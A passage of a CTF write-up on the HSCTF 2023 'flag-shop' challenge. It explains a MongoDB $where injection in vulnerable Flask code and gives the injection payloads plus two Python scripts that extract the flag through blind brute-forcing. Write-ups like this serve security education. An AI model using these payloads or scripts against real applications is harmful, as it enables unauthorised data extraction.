</span></span></code></pre></div><p>Nothing that we couldn&rsquo;t have discovered by playing around with the website.</p>
<h2 id="playing-around">Playing around<a hidden class="anchor" aria-hidden="true" href="#playing-around">#</a></h2>
<p>A quick analysis of the code would have been enough to understand where the vulnerability lies, but my teammate and I decided to bombard the <code>search</code> field. Everything seems to be working correctly, and searching with an empty <code>textfield</code> returns all results.</p>
<p>The payloads from the <!-- raw HTML omitted -->PayloadsAllTheThings<!-- raw HTML omitted --> repository are mostly used for <!-- raw HTML omitted -->login bypass<!-- raw HTML omitted -->, while the <!-- raw HTML omitted -->SSJI<!-- raw HTML omitted --> payloads don&rsquo;t seem to do anything.</p>
<p>When we send <code>0;return true</code>, no result is displayed, while with <code>';return 'a'=='a' &amp;&amp; ''=='</code>, the previous query result remains (unexpected behavior, it should give us either a different result or an error).</p>
<p>Stupidly, we didn&rsquo;t take a look at the logs, but this is what happened if a 500 error code was obtained. Perfect! I only understood this after trying to send the payload to the <code>api/search</code> endpoint with <!-- raw HTML omitted -->Burp Repeater<!-- raw HTML omitted -->. We now know for sure that the vulnerability lies in the definition of the query.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api/search&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">search</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>json <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;search&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>json:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;No search provided&#34;</span>, <span style="color:#e6db74">&#34;results&#34;</span>: []}), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		results <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>flags<span style="color:#f92672">.</span>find(
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;$where&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this.challenge.includes(&#39;</span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;search&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>			}, {
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;_id&#34;</span>: <span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;flag&#34;</span>: <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		)<span style="color:#f92672">.</span>sort(<span style="color:#e6db74">&#34;challenge&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> pymongo<span style="color:#f92672">.</span>errors<span style="color:#f92672">.</span>PyMongoError:
</span></span><span style="display:flex;"><span>		traceback<span style="color:#f92672">.</span>print_exc()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Database error&#34;</span>, <span style="color:#e6db74">&#34;results&#34;</span>: []}), <span style="color:#ae81ff">500</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;results&#34;</span>: list(results)}), <span style="color:#ae81ff">200</span>
</span></span></code></pre></div><p>The if statement and error handling are normal. The only line to analyze is the <code>$where</code> clause.</p>
<h2 id="exploiting-the-vulnerability-extended-thought-process">Exploiting the vulnerability (extended thought process)<a hidden class="anchor" aria-hidden="true" href="#exploiting-the-vulnerability-extended-thought-process">#</a></h2>
<p>The input is directly inserted with an <!-- raw HTML omitted -->f-string<!-- raw HTML omitted --> with 0 sanitization. Referring to the MongoDB <code>$where</code> clause <!-- raw HTML omitted -->documentation<!-- raw HTML omitted -->, we read:</p>
<blockquote>
<p>Use the <code>$where</code> operator to pass either a string containing a JavaScript expression or a full JavaScript function to the query system.</p>
</blockquote>
<p>It could be intuitively understood by reading the content of <code>db.flags.find()</code> that the <code>$where</code> clause executes any JavaScript code passed to it.</p>
<p>At this point, I copied the JS code to a code editor. When I have challenges like this, to make things easier for me, I copy the string and try to construct a very simple payload without moving the cursor.</p>
<p>With <code>');</code> we escaped the string and closed the statement, giving us an <!-- raw HTML omitted -->SSJI<!-- raw HTML omitted -->. All that&rsquo;s left is to get rid of the extra <code>')'</code> at the end. I wasn&rsquo;t able to do this (and I don&rsquo;t think it was possible, but it certainly wasn&rsquo;t necessary) since I couldn&rsquo;t use comments. So, I went full monkey mode and just copied the previous function, forming a first test payload:</p>
<p><code>'); this.challenge.includes('</code>, interpreted as <code>this.challenge.includes(''); this.challenge.includes('')</code> by the program. The output is what we expected and desired, which is to return all results (like a <code>' OR 1=1</code>).</p>
<p>By testing or reading the documentation, we can discover that this happens because only the last valid condition is computed by the $where clause. This means that we can write anything in the first <code>include</code>, since it won&rsquo;t be interpreted (<code>something'); this.challenge.includes('</code>):</p>
<p><img loading="lazy" src="/writeups/flagshop_hsctf/burp1.png" alt="Burp Suite screenshot showing the result of a request sent with the payload (&lt;code&gt;something&#39;); this.challenge.includes(&#39;&lt;/code&gt;), which returns all the results from the database"  />
</p>
<p>While the second one is interpreted (<code>something'); this.challenge.includes('search</code>):</p>
<p><img loading="lazy" src="/writeups/flagshop_hsctf/burp2.png" alt="Burp Suite screenshot showing that if we include a search parameter in the injected &amp;lsquo;include&amp;rsquo;, the query will execute it"  />
</p>
<p>So we have the vulnerability, but we cannot directly retrieve the flag since it is excluded from the query (if you&rsquo;re not sure, please reread the source code).
I then tried a payload with a boolean operator (<code>something'); always_true() || this.challenge.includes('something</code>):</p>
<p><img loading="lazy" src="/writeups/flagshop_hsctf/burp3.png" alt="Burp Suite screenshot showing all challenges result after including an &amp;lsquo;or 1==1&amp;rsquo; before the injected search parameter"  />
</p>
<p>This is very useful for searching for a potential attack. We can perform a conditional check on the flag using <code>&amp;&amp; this.challenge.includes('flag')</code> to only get results from the <code>flag-shop</code> entity. We can do a first test with the flag format (<code>something'); this.flag.includes('flag{') &amp;&amp; this.challenge.includes('flag</code>):
<img loading="lazy" src="/writeups/flagshop_hsctf/FirstBlind.png" alt="Burp Suite screenshot showing result including &amp;lsquo;flag{&amp;rsquo;"  />

<img loading="lazy" src="/writeups/flagshop_hsctf/BlindNotWorking.png" alt="Burp Suite screenshot showing no result after including a random word as search parameter"  />
</p>
<p>We will have to take advantage of this behavior, performing a small brute force to reconstruct the flag character by character. We can now start to construct our payload.</p>
<h2 id="final-payload">Final payload<a hidden class="anchor" aria-hidden="true" href="#final-payload">#</a></h2>
<h3 id="payload-used-during-the-ctf">Payload used during the CTF<a hidden class="anchor" aria-hidden="true" href="#payload-used-during-the-ctf">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib3
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span>urllib3<span style="color:#f92672">.</span>disable_warnings()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://flag-shop.hsctf.com/api/search&#34;</span>
</span></span><span style="display:flex;"><span>headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;content-type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>}
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag{&#34;</span>
</span></span><span style="display:flex;"><span>search <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;kj&#39;); this.flag.includes(&#39;</span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) &amp;&amp; this.challenge.includes(&#39;flag&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            print(c)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> c <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;*&#39;</span>,<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;.&#39;</span>,<span style="color:#e6db74">&#39;?&#39;</span>,<span style="color:#e6db74">&#39;|&#39;</span>,<span style="color:#e6db74">&#39;&amp;&#39;</span>,<span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>]:
</span></span><span style="display:flex;"><span>                search <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;kj&#39;); this.flag.includes(&#39;</span><span style="color:#e6db74">{</span>flag <span style="color:#f92672">+</span> c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) &amp;&amp; this.challenge.includes(&#39;flag&#34;</span>
</span></span><span style="display:flex;"><span>                payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;search&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;</span> <span style="color:#f92672">%</span> (search)
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;connecting to CTF platform...&#34;</span>)
</span></span><span style="display:flex;"><span>                r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data <span style="color:#f92672">=</span> payload, headers<span style="color:#f92672">=</span>headers, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#print(payload)</span>
</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>                print(result[<span style="color:#e6db74">&#34;results&#34;</span>])
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> bool(result[<span style="color:#e6db74">&#34;results&#34;</span>]):
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#34;Found one more char : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (flag<span style="color:#f92672">+</span>c))
</span></span><span style="display:flex;"><span>                    flag <span style="color:#f92672">+=</span> c
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span></code></pre></div><h3 id="final-payload-1">Final payload<a hidden class="anchor" aria-hidden="true" href="#final-payload-1">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib3
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span>urllib3<span style="color:#f92672">.</span>disable_warnings()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://flag-shop.hsctf.com/api/search&#34;</span>
</span></span><span style="display:flex;"><span>headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;content-type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>}
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag{&#34;</span>
</span></span><span style="display:flex;"><span>search <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;kj&#39;); this.flag.includes(&#39;</span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) &amp;&amp; this.challenge.includes(&#39;flag&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> c <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;*&#39;</span>,<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;.&#39;</span>,<span style="color:#e6db74">&#39;?&#39;</span>,<span style="color:#e6db74">&#39;|&#39;</span>,<span style="color:#e6db74">&#39;&amp;&#39;</span>,<span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>]:
</span></span><span style="display:flex;"><span>                search <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;kj&#39;); this.flag.includes(&#39;</span><span style="color:#e6db74">{</span>flag <span style="color:#f92672">+</span> c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) &amp;&amp; this.challenge.includes(&#39;flag&#34;</span>
</span></span><span style="display:flex;"><span>                payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;search&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;</span> <span style="color:#f92672">%</span> (search)
</span></span><span style="display:flex;"><span>                r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data <span style="color:#f92672">=</span> payload, headers<span style="color:#f92672">=</span>headers, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> bool(result[<span style="color:#e6db74">&#34;results&#34;</span>]):
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#34;Found one more char : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (flag<span style="color:#f92672">+</span>c))
</span></span><span style="display:flex;"><span>                    flag <span style="color:#f92672">+=</span> c
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span></code></pre></div><p>As you can see, the only difference is that the first payload has more <code>print</code> statements.</p>
<p>This is because, due to the nature of the challenge and the fact that many others were also brute-forcing, the infrastructure became unresponsive for a few seconds, causing exceptions or blocking the request indefinitely.</p>
<p>The &lsquo;print&rsquo; statements were only used for debugging (which is unnecessary when the infrastructure is not being bombarded), and in the second payload, I only left those related to the flag search.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> c <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;*&#39;</span>,<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;.&#39;</span>,<span style="color:#e6db74">&#39;?&#39;</span>,<span style="color:#e6db74">&#39;|&#39;</span>,<span style="color:#e6db74">&#39;&amp;&#39;</span>,<span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>]
</span></span></code></pre></div><p>is used to exclude characters that can cause problems with the payload string or the server, while the <code>try/except</code> is used to avoid losing progress in case of an error.</p>
<p>It was also very useful during the competition because CTRL-C moves on to the next character instead of closing the program.</p>
<p>This way, in case the program got stuck (which happened about ten times during the competition, but not at all when I tried it on the post-competition infrastructure), I would only skip one character instead of having to start over and retrieve the last characters manually.</p>
<p>In this case, I found a very simple blind NoSQL injection, but it is a good challenge if you are new to building custom payloads or have never encountered a blind NoSQL vulnerability before.</p>
<p>Thank you for reading until the end! I am happy to accept any questions or feedback.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://tiziano-caruana.github.io/it/tags/writeup/">Writeup</a></li>
      <li><a href="http://tiziano-caruana.github.io/it/tags/ctfs/">CTFs</a></li>
      <li><a href="http://tiziano-caruana.github.io/it/tags/hsctf-2023/">Hsctf-2023</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="http://tiziano-caruana.github.io/it/">Tiziano Caruana</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copia';

        function copyingDone() {
            copybutton.innerHTML = 'copiato!';
            setTimeout(() => {
                copybutton.innerHTML = 'copia';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
